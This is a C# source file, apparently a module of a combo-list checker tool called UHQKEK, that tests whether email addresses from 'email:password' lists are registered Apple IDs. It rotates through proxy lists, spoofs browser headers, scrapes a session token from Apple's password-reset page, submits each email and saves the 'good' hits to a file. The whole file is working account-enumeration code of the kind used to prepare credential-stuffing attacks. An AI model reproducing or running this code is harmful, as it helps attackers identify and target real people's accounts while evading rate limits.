using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using HttpStatusCode = Leaf.xNet.HttpStatusCode;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class Apple
    {
        public static bool check(string combo)
        {
            try
            {

                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Pragma", "no - cache");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AllowAutoRedirect = false;
                string str2 = httpRequest.Get("https://iforgot.apple.com/password/verify/appleid").ToString();
                string stt = Cryptography.LR(str2, "\"sstt\":\"", "\"").FirstOrDefault();
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36");
                httpRequest.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                httpRequest.AddHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
                httpRequest.AddHeader("Content-Type", "application/json");
                httpRequest.AddHeader("Host", "iforgot.apple.com");
                httpRequest.AddHeader("Origin", "https://iforgot.apple.com");
                httpRequest.AddHeader("Referer", "https://iforgot.apple.com/password/verify/appleid");
                httpRequest.AddHeader("sstt", stt);
                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                httpRequest.AllowAutoRedirect = false;
                string str3 = httpRequest.Post("https://iforgot.apple.com/password/verify/appleid", "{\"id\":\"" + strArray1[0] + "\"}", "application/json").ToString();

                string str4 = httpRequest.Cookies.GetCookies("https://iforgot.apple.com/password/verify/appleid")["X-Apple-I-Web-Token"].ToString();
                if (string.IsNullOrEmpty(str4))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Green);
                    }
                    Program.Save(combo, "Apple VM");
                    return true;
                }
                else if (str3.Contains("This Apple ID is not valid or not supported"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
